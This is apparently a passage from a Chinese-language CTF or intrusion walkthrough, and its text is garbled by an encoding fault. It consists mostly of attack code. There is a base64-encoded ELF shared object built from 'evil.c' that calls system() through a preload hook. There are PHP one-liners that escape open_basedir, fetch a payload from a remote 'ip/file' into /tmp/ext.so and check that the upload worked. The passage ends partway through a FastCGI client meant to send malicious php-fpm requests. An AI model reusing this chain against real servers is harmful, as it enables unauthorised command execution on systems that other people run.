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AAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADYAwAAAAAAANgDAAAAAAAAwAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAmAQAAAAAAACYBAAAAAAAABgAAAAAAAAAAwAAABUAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAXAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAAAgEAAAAAAAACAQAAAAAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAQBAAAAAAAABAEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAhwAAAAEAAAAGAAAAAAAAAFAQAAAAAAAAUBAAAAAAAADPAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAI0AAAABAAAABgAAAAAAAAAgEQAAAAAAACARAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACTAAAAAQAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAADYAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAmwAAAAEAAAACAAAAAAAAADggAAAAAAAAOCAAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKkAAAABAAAAAgAAAAAAAABgIAAAAAAAAGAgAAAAAAAAfAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACzAAAADgAAAAMAAAAAAAAA8D0AAAAAAADwLQAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAvwAAAA8AAAADAAAAAAAAAAA+AAAAAAAAAC4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAMsAAAAGAAAAAwAAAAAAAAAIPgAAAAAAAAguAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAACCAAAAAQAAAAMAAAAAAAAAyD8AAAAAAADILwAAAAAAACAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1AAAAAEAAAADAAAAAAAAAOg/AAAAAAAA6C8AAAAAAAAgAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN0AAAABAAAAAwAAAAAAAAAIQAAAAAAAAAgwAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADjAAAACAAAAAMAAAAAAAAAEEAAAAAAAAAQMAAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6AAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAEDAAAAAAAAAeAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAADAwAAAAAAAAcAIAAAAAAAAaAAAAFAAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACgMgAAAAAAAHwBAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAHDQAAAAAAADxAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==&#x27;</span>));</span><br></pre></td></tr></table></figure><p>æµ‹,æ‰“ä¸å‡ºæ¥,è¿˜å¾—æ˜¯copy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;wcsndm&#x27;</span>);chdir(<span class="string">&#x27;wcsndm&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);copy(<span class="string">&#x27;ip/file&#x27;</span>,<span class="string">&#x27;/tmp/ext.so&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;wcsndm&#x27;</span>);chdir(<span class="string">&#x27;wcsndm&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);$a = new FilesystemIterator(<span class="string">&quot;glob:///tmp/*&quot;</span>);foreach($a <span class="keyword">as</span> $f)&#123;echo($f-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure><p>æ£€æµ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸ</p><h2 id="ç”Ÿæˆfpmæ¶æ„æ•°æ®"><span id="ç”Ÿæˆfpmæ¶æ„æ•°æ®"> ç”Ÿæˆfpmæ¶æ„æ•°æ®</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Note : Code <span class="keyword">is</span> released under the GNU LGPL</span><br><span class="line"> *</span><br><span class="line"> * Please do <span class="keyword">not</span> change the header of this file</span><br><span class="line"> *</span><br><span class="line"> * This library <span class="keyword">is</span> free software; you can redistribute it <span class="keyword">and</span>/<span class="keyword">or</span> modify it under the terms of the GNU</span><br><span class="line"> * Lesser General Public License <span class="keyword">as</span> published by the Free Software Foundation; either version <span class="number">2</span> of</span><br><span class="line"> * the License, <span class="keyword">or</span> (at your option) <span class="built_in">any</span> later version.</span><br><span class="line"> *</span><br><span class="line"> * This library <span class="keyword">is</span> distributed <span class="keyword">in</span> the hope that it will be useful, but WITHOUT ANY WARRANTY;</span><br><span class="line"> * without even the implied warranty of MERCHANTABILITY <span class="keyword">or</span> FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line"> *</span><br><span class="line"> * See the GNU Lesser General Public License <span class="keyword">for</span> more details.</span><br><span class="line"> */</span><br><span class="line">/**</span><br><span class="line"> * Handles communication <span class="keyword">with</span> a FastCGI application</span><br><span class="line"> *</span><br><span class="line"> * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;</span><br><span class="line"> * @version     <span class="number">1.0</span></span><br><span class="line"> */</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FCGIClient</span></span><br><span class="line">&#123;</span><br><span class="line">    const VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    const BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    const ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    const END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    const PARAMS               = <span class="number">4</span>;</span><br><span class="line">    const STDIN                = <span class="number">5</span>;</span><br><span class="line">    const STDOUT               = <span class="number">6</span>;</span><br><span class="line">    const STDERR               = <span class="number">7</span>;</span><br><span class="line">    const DATA                 = <span class="number">8</span>;</span><br><span class="line">    const GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    const GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    const UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    const MAXTYPE              = self::UNKNOWN_TYPE;</span><br><span class="line">    const RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    const AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    const FILTER               = <span class="number">3</span>;</span><br><span class="line">    const REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    const CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    const OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    const UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    const MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    const MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    const MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    const HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    /**</span><br><span class="line">     * Socket</span><br><span class="line">     * @var Resource</span><br><span class="line">     */</span><br><span class="line">    private $_sock = null;</span><br><span class="line">    /**</span><br><span class="line">     * Host</span><br><span class="line">     * @var String</span><br><span class="line">     */</span><br><span class="line">    private $_host = null;</span><br><span class="line">    /**</span><br><span class="line">     * Port</span><br><span class="line">     * @var Integer</span><br><span class="line">     */</span><br><span class="line">    private $_port = null;</span><br><span class="line">    /**</span><br><span class="line">     * Keep Alive</span><br><span class="line">     * @var Boolean</span><br><span class="line">     */</span><br><span class="line">    private $_keepAlive = false;</span><br><span class="line">    /**</span><br><span class="line">     * Constructor</span><br><span class="line">     *</span><br><span class="line">     * @param String $host Host of the FastCGI application</span><br><span class="line">     * @param Integer $port Port of the FastCGI application</span><br><span class="line">     */</span><br><span class="line">    public function __construct($host, $port = <span class="number">9001</span>) // <span class="keyword">and</span> default value <span class="keyword">for</span> port, just <span class="keyword">for</span> unixdomain socket</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_host = $host;</span><br><span class="line">        $this-&gt;_port = $port;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Define whether <span class="keyword">or</span> <span class="keyword">not</span> the FastCGI application should keep the connection</span><br><span class="line">     * alive at the end of a request</span><br><span class="line">     *</span><br><span class="line">     * @param Boolean $b true <span class="keyword">if</span> the connection should stay alive, false otherwise</span><br><span class="line">     */</span><br><span class="line">    public function setKeepAlive($b)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_keepAlive = (boolean)$b;</span><br><span class="line">        <span class="keyword">if</span> (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123;</span><br><span class="line">            fclose($this-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Get the keep alive status</span><br><span class="line">     *</span><br><span class="line">     * @<span class="keyword">return</span> Boolean true <span class="keyword">if</span> the connection should stay alive, false otherwise</span><br><span class="line">     */</span><br><span class="line">    public function getKeepAlive()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Create a connection to the FastCGI application</span><br><span class="line">     */</span><br><span class="line">    private function connect()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$this-&gt;_sock) &#123;</span><br><span class="line">            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, <span class="number">5</span>);</span><br><span class="line">            $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!$this-&gt;_sock) &#123;</span><br><span class="line">                throw new Exception(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Build a FastCGI packet</span><br><span class="line">     *</span><br><span class="line">     * @param Integer $<span class="built_in">type</span> <span class="type">Type</span> of the packet</span><br><span class="line">     * @param String $content Content of the packet</span><br><span class="line">     * @param Integer $requestId RequestId</span><br><span class="line">     */</span><br><span class="line">    private function buildPacket($<span class="built_in">type</span>, $content, $requestId = <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $clen = strlen($content);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(self::VERSION_1)         /* version */</span><br><span class="line">            . <span class="built_in">chr</span>($<span class="built_in">type</span>)                    /* <span class="built_in">type</span> */</span><br><span class="line">            . <span class="built_in">chr</span>(($requestId &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) /* requestIdB1 */</span><br><span class="line">            . <span class="built_in">chr</span>($requestId &amp; <span class="number">0xFF</span>)        /* requestIdB0 */</span><br><span class="line">            . <span class="built_in">chr</span>(($clen &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     /* contentLengthB1 */</span><br><span class="line">            . <span class="built_in">chr</span>($clen &amp; <span class="number">0xFF</span>)             /* contentLengthB0 */</span><br><span class="line">            . <span class="built_in">chr</span>(<span class="number">0</span>)                        /* paddingLength */</span><br><span class="line">            . <span class="built_in">chr</span>(<span class="number">0</span>)                        /* reserved */</span><br><span class="line">            . $content;                     /* content */</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Build an FastCGI Name value pair</span><br><span class="line">     *</span><br><span class="line">     * @param String $name Name</span><br><span class="line">     * @param String $value Value</span><br><span class="line">     * @<span class="keyword">return</span> String FastCGI Name value pair</span><br><span class="line">     */</span><br><span class="line">    private function buildNvpair($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        <span class="keyword">if</span> ($nlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            /* nameLengthB0 */</span><br><span class="line">            $nvpair = <span class="built_in">chr</span>($nlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br><span class="line">            $nvpair = <span class="built_in">chr</span>(($nlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="built_in">chr</span>(($nlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="built_in">chr</span>(($nlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="built_in">chr</span>($nlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($vlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            /* valueLengthB0 */</span><br><span class="line">            $nvpair .= <span class="built_in">chr</span>($vlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br><span class="line">            $nvpair .= <span class="built_in">chr</span>(($vlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="built_in">chr</span>(($vlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="built_in">chr</span>(($vlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="built_in">chr</span>($vlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        /* nameData &amp; valueData */</span><br><span class="line">        <span class="keyword">return</span> $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Read a <span class="built_in">set</span> of FastCGI Name value pairs</span><br><span class="line">     *</span><br><span class="line">     * @param String $data Data containing the <span class="built_in">set</span> of FastCGI NVPair</span><br><span class="line">     * @<span class="keyword">return</span> array of NVPair</span><br><span class="line">     */</span><br><span class="line">    private function readNvpair($data, $length = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $array = array();</span><br><span class="line">        <span class="keyword">if</span> ($length === null) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($p != $length) &#123;</span><br><span class="line">            $nlen = <span class="built_in">ord</span>($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($nlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $nlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $nlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $nlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = <span class="built_in">ord</span>($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($vlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $vlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $vlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $vlen |= (<span class="built_in">ord</span>($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        